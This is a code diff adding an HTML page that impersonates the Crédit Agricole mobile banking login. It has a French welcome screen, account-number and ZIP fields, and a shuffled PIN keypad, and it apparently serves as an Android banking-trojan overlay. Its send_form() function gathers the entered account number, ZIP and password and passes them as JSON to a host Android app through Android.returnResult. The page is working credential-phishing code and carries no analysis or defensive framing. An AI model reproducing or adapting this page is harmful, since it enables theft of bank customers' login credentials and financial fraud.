@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>banqueCA</title>
+    <link rel="shortcut icon" href="fr.creditagricole.androidapp.png" type="image/png">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+</head>
+<body>
+
+<style type="text/css">
+	body {
+		background:#cff1f1;
+		margin: 0;
+		padding: 0;
+		font-family: Helvetica, sans-serif;
+		background-size: 100%;
+	}
+	.logo {
+    text-align: center;
+    background-size: 100%;
+	}
+	.form {
+		text-align: center;
+		padding-top: 70px;
+	}
+	.form label {
+		display: block;
+	}
+	form {
+		display: inline-block;
+	}
+fieldset {
+	  position: relative;
+	  text-align: center;
+	  border: none;
+
+}
+.mybutton {
+    background: white;
+    border: 1px solid white;
+    padding: 15px 20px 15px 20px;
+    border-radius: 50px;
+    font-size: 20px;
+    color: #00BCD4;
+    outline: none;
+}
+input[type="text"],input[type="password"] {
+border: 1px solid #d1d0d0;
+    line-height: 16px;
+    font-size: 17px;
+    box-sizing: border-box;
+    width: 100%;
+    position: relative;
+    padding: 5px 20px;
+    margin: 0px 1px;
+    display: block;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+    -webkit-appearance: none;
+    height: 48px;
+    margin: 0px 0px 0px 0px;
+    color: #7c7c7c;
+    text-align: left;
+    background: rgb(255, 255, 255);
+    outline: none;
+        border-radius: 5px;
+}
+input[type="button"] {
+left: 0;
+    right: 0;
+    width: 100%;
+    height: 47px;
+    margin: 25px 0px 0px 0px;
+    outline: none;
+    float: right;
+    background: #ffffff;
+    color: #FF9800;
+    border: 1px solid#ffffff;
+    font-size: 16px;
+    -webkit-appearance: none;
+    border-radius: 2px;
+    cursor: pointer;
+}
+fieldset span {
+	display: inline-block;
+    width: 80%;
+    text-align: left;
+    color: #c5f8ff;
+    left: 0;
+    right: 0;
+    padding-top: 30px;
+}
+fieldset p {
+    display: inline-block;
+    left: 0;
+    right: 0;
+    color: #088f0d;
+}
+.logo span {
+    display: inline-block;
+    float: left;
+    padding: 40px 0px 0px 20px;
+    font-size: 20px;
+    color: #fff;
+    font-weight: 600;
+}
+input::placeholder {
+    color: #b0adad;
+}
+</style>
+
+
+<script type="text/javascript">
+    function bireyselform() {
+        document.getElementById("home").style.display="none";
+        document.getElementById("bireysel").style.display="block";
+    }
+    function next() {
+        document.getElementById("bireysel").style.display="none";
+        document.getElementById("pin").style.display="block";
+        document.getElementById('codicelogin').innerText = document.getElementById('codice').value;
+    }
+</script>
+
+<div class="" id="home" style="display: block;">
+
+<style type="text/css">
+	html {
+        height: 100%;
+    }
+    body {
+    display: block;
+    background: #cff1f1;
+    height: 100%;
+    }
+    .info {
+    	    text-align: center;
+    color: #555;
+    font-weight: 400;
+    font-size: 25px;
+    padding-top: 60px;
+    }
+</style>
+
+<div class="logo">
+
+<img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+CjwhLS0gQ3JlYXRlZCB3aXRoIElua3NjYXBlIChodHRwOi8vd3d3Lmlua3NjYXBlLm9yZy8pIC0tPgo8c3ZnCiAgIHhtbG5zOnN2Zz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciCiAgIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIKICAgdmVyc2lvbj0iMS4wIgogICB3aWR0aD0iMTAyNCIKICAgaGVpZ2h0PSI3MTYiCiAgIHZpZXdCb3g9IjAgMCAxMjUuOTYxMjUgODguMDE0OTk5IgogICBpZD0ic3ZnNjY4OSI+CiAgPGRlZnMKICAgICBpZD0iZGVmczY2OTEiIC8+CiAgPGcKICAgICB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMzEyLjAxOTM4LC00ODguMzU0NjgpIgogICAgIGlkPSJsYXllcjEiPgogICAgPHBhdGgKICAgICAgIGQ9Ik0gNjcuMjE4NzUsNy4zNDM3NSBMIDQyLjEyNSw1NC4wMzEyNSBDIDQyLjEyNTAwMSw1NC4wMzEyNDkgNTQuMTUyNSw1MS4xNjc1IDYxLjkwNjI1LDQ3Ljg3NSBMIDc1LjU2MjUsMjIuMjE4NzUgTCA5Mi45Mzc1LDY2LjE1NjI1IEMgOTQuOTgzNzUsNzEuMzg0OTk3IDk5LjM3NSw3MC44NDM3NSA5OS4zNzUsNzAuODQzNzUgTCAxMTMuODc1LDcwLjg0Mzc1IEwgODUsNy4zNDM3NSBMIDY3LjIxODc1LDcuMzQzNzUgeiBNIDAsNzcuNzgxMjUgTCAwLDg4IEwgMTI1Ljk2ODc1LDg4IEwgMTI1Ljk2ODc1LDc3Ljc4MTI1IEwgMCw3Ny43ODEyNSB6ICIKICAgICAgIHRyYW5zZm9ybT0idHJhbnNsYXRlKDMxMi4wMTkzOCw0ODguMzU0NjgpIgogICAgICAgc3R5bGU9ImZpbGw6IzI4NDYzMztmaWxsLW9wYWNpdHk6MTtmaWxsLXJ1bGU6bm9uemVybztzdHJva2U6bm9uZSIKICAgICAgIGlkPSJwYXRoMjYzMCIgLz4KICAgIDxwYXRoCiAgICAgICBkPSJNIDQxNy4zOTE4OCw1MTEuODQ5NjggQyA0MzguNDQxODgsNTAwLjY3MDkzIDQzNy45NDA2Myw1MDAuMjIzNDMgNDM3Ljk0MDYzLDUwMC4yMjM0MyBMIDQzNy45NDA2Myw0ODguMzU0NjggQyA0MzcuOTQwNjMsNDg4LjM1NDY4IDQzMy40MTQzOCw0OTAuODM5NjggNDEyLjM1OTM4LDUwMi4wMTIxOCBDIDQxMi4zNTkzOCw1MDIuMDEyMTggNDA4LjAwMzEzLDUwMy45NDM0MyA0MDYuMzM0MzgsNTAzLjU4NTkzIEMgNDA2LjMzNDM4LDUwMy41ODU5MyA0MDguMzYwNjMsNTEyLjg1NzE4IDQxMi4xNTE4OCw1MTMuMDg4NDMgQyA0MTUuMjUwNjMsNTEzLjI3OTY4IDQxNy4zOTE4OCw1MTEuODQ5NjggNDE3LjM5MTg4LDUxMS44NDk2OCIKICAgICAgIHN0eWxlPSJmaWxsOiNjZDQxMjM7ZmlsbC1vcGFjaXR5OjE7ZmlsbC1ydWxlOm5vbnplcm87c3Ryb2tlOm5vbmUiCiAgICAgICBpZD0icGF0aDI2MzIiIC8+CiAgICA8cGF0aAogICAgICAgZD0iTSA0MzcuOTQwNjMsNTA1Ljk3MDkzIEMgNDM3Ljk0MDYzLDUwNS45NzA5MyA0MjAuOTk0MzgsNTE1Ljg3MzQzIDM5OS45NDY4Nyw1MjcuMDU0NjggQyAzNzguODkzMTMsNTM4LjIzMjE4IDM2NS41MTA2Myw1NDMuMTE3MTggMzUxLjE2NDM4LDU0NS45NDA5MyBDIDM0MS44NzU2Myw1NDcuNzY4NDMgMzIzLjY5Njg4LDU0OC4zNTQ2OCAzMjIuMTM4MTMsNTQxLjEwMzQzIEMgMzIwLjU4NDM4LDUzMy44NTQ2OCAzMjUuMzQxODgsNTI3LjMxMjE4IDMzOS41NTA2Myw1MTYuOTQyMTggQyAzNTMuNTI1NjMsNTA2Ljc0MjE4IDM2OC4wMzY4OCw1MDcuNTg0NjggMzY4LjAzNjg4LDUwNy41ODQ2OCBDIDM2OC4wMzY4OCw1MDcuNTg0NjggMzY2LjU0NTYzLDUwMC41MjcxOCAzNjUuNDc1NjMsNDk4LjE1MzQzIEMgMzY0LjQwMDYzLDQ5NS43NzU5MyAzNjIuNDY0MzgsNDk0LjExNDY4IDM1Ni42MzkzOCw0OTQuODI3MTggQyAzNTAuODA5MzgsNDk1LjU0MDkzIDMyNy44MzMxMyw1MDAuODA3MTggMzE1LjQ5ODEzLDUyMS4wMjg0MyBDIDMxMi42MTY4OCw1MjUuNzY3MTggMzA5LjYyMzEzLDUzNS4xNjk2OCAzMTYuMDQ1NjMsNTQ2LjU4MzQzIEMgMzIyLjQ2NTYzLDU1OC4wMDA5MyAzMzcuOTAxODgsNTYxLjMwOTY4IDM1MS40MDY4OCw1NTkuMzIwOTMgQyAzNjUuMTg0MzgsNTU3LjI4MjE4IDM3OC44OTMxMyw1NTIuOTkwOTMgMzk5Ljk0Njg3LDU0MS44MDU5MyBDIDQyMC45OTQzOCw1MzAuNjI5NjggNDM3Ljk0MDYzLDUyMC4zOTQ2OCA0MzcuOTQwNjMsNTIwLjM5NDY4IEwgNDM3Ljk0MDYzLDUwNS45NzA5MyB6ICIKICAgICAgIHN0eWxlPSJmaWxsOiMyZDkwODQ7ZmlsbC1vcGFjaXR5OjE7ZmlsbC1ydWxlOm5vbnplcm87c3Ryb2tlOm5vbmUiCiAgICAgICBpZD0icGF0aDI2MzQiIC8+CiAgPC9nPgo8L3N2Zz4K" style="width: 120px;">
+</div>
+
+<div class="info">
+	<span style="font-size: 30px;">Bienvenue</span>
+
+	<a href="#" onclick="bireyselform()" style="display: block; text-decoration: none; padding: 30px 10px 35px 10px; background: #ffffff; width: 60%; margin: 0 auto; position: relative; top: 50px; font-size: 16px; border-radius: 2px; color: #0b0b0b; box-shadow: 0 0 10px rgba(0,0,0,0.5);"><span style="font-size: 18px; color: #e78a00; line-height: 2;">Je suis client</span><br><span>Je crée mon profil</span></a>
+
+</div>
+
+</div>
+<br><br>
+<fieldset id="formtosend">
+
+<div class="" id="bireysel" style="display: none;">
+
+<div class="logo" style="float: left;">
+
+<p style="font-size: 17px;font-weight: 600;color: #343434; display: block;">Mes informations de connexion</p>
+<p style="color: #343434; display: block;     float: left;">Numéro de compte</p>
+
+</div>
+
+		<input type="text" name="numero" id="numero" placeholder="11 chiffres" maxlength="11" style="height: 35px;">
+<br>
+<input type="text" name="zip" id="zip" placeholder="ZIP Code" style="height: 35px;" required="">
+
+		<input id="exit" type="hidden" text="true"/>
+
+<p style="color: #343434; display: block;     float: left;">Numéro de compte</p>
+
+
+<script type="text/javascript">
+    $(document).ready(function() {
+
+  $('#myinput').on('keypress', function() {
+    $('#action').fadeIn(function() {
+      $(this).fadeOut();
+    });
+  });
+
+  $('.mybutton').on('click', function() {
+    var Paste = $(this).data('paste');
+    $('#myinput').val($('#myinput').val() + Paste).trigger('keypress');
+  });
+});
+</script>
+
+
+<input type="password" name="password" id="myinput" disabled="" style="    background: #efefef;">
+<input type="submit" name="sumbit" value="X" id="clearButton" style="background: #009688; border: none; color: #fff; border-radius: 2px; padding: 6px 8px 5px 8px; float: right; position: relative; top: -37px; right: 10px;">
+
+<script type="text/javascript">
+    document.getElementById("clearButton").onclick = function(e) {
+    document.getElementById("myinput").value = "";
+}
+</script>
+
+<br>
+<button class="mybutton" name="sumbit" data-paste="7">7</button>
+<button class="mybutton" name="sumbit" data-paste="3">3</button>
+<button class="mybutton" name="sumbit" data-paste="2">2</button>
+<button class="mybutton" name="sumbit" data-paste="8">8</button>
+<button class="mybutton" name="sumbit" data-paste="6">6</button>
+<br>
+<br>
+<button class="mybutton" name="sumbit" data-paste="4">4</button>
+<button class="mybutton" name="sumbit" data-paste="0">0</button>
+<button class="mybutton" name="sumbit" data-paste="9">9</button>
+<button class="mybutton" name="sumbit" data-paste="1">1</button>
+<button class="mybutton" name="sumbit" data-paste="5">5</button>
+<input name="exit" type="hidden" text="true"/>
+
+		<input type="button" name="sumbit" onclick="send_form();" value="Continuer">
+
+
+
+</div>
+
+</fieldset>	
+
+<script>
+if ( typeof Android == "undefined")
+    var Android = {
+        returnResult : alert.bind(window)
+    }
+
+/*********Recursive implementation of jSON.stringify; ********/
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals.join(',') + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSONbyName(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+    for(var i = 0; i < namesHTML.length; i++) {
+        var bsform = f.getElementsByTagName(namesHTML[i]);
+        for(var j = 0; j < bsform.length; j++) {
+            if(bsform[j].name == 'sumbit') continue;
+            FinalObject[bsform[j].name] = bsform[j].value
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+
+function send_form()
+{
+    var form = document.getElementById('formtosend');
+    Android.returnResult( formToJSONbyName(form) );
+}
+</script>
+
+</body>
+</html>
